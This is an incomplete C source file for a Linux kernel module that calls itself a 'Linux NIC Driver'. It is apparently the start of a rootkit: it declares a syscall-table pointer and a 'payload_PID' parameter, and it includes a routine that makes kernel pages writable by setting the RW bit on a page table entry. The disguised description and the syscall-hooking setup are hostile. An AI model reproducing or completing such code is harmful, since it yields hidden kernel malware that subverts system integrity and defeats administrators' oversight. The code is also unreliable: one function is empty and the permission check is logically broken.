/*
    Author:     1emvr <1emvr@protonmail.com> Thu Jan 26 22:27 2023 -0500
*/
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/stat.h>
/*
 ^
    Default headers
*/
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <unistd.h>
#include <asm/paravirt.h>
/*
 ^
    Systemcall tables and functions, etc.
*/
#include <linux/in.h>
#include <linux/net.h>
#include <linux/uaccess.h>
/*
 ^
    Networking
*/
#define DRIVER_AUTHOR "Lemur"
#define DRIVER_DESCRIPTION "Linux NIC Driver"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);
MODULE_SUPPORTED_DEVICE("Network interface");
MODULE_VERSION("v1.1");
MODULE_PARM_DESC(payload_PID, "process ID");

unsigned long** SYS_CALL_TABLE;

void enablePageWrite(unsigned long address) {
    unsigned int level;
    pte_t* pte = lookup_address(address, &level);
    if (pte->pte & ~_PAGE_RW)
        pte->pte |= _PAGE_RW; printk(KERN_INFO "Page permissions set.\n");
    // Map virtual address from physical and change RW permission in register
}
void disablePageWrite(unsigned long address) {
    unsigned int level;
    pte_t* pte = lookup_address(address, &level);
}